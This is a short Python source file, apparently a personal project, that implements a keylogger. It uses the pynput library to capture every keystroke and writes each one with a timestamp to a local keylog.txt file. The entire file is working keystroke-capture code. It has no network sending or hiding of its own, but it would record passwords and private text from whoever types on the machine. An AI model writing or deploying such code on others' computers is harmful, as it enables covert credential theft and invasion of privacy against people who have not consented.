from logging import DEBUG
from pynput.keyboard import Listener
from shutil import copyfile
import os
import logging

# username = os.getlogin()
# logging_dir = f"C:\{username}\Desktop"
logging_dir = f"G:\Soham\Programming Projects\Keylogger"

logging.basicConfig(filename=f"{logging_dir}/keylog.txt", level=logging.DEBUG, format= "%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()



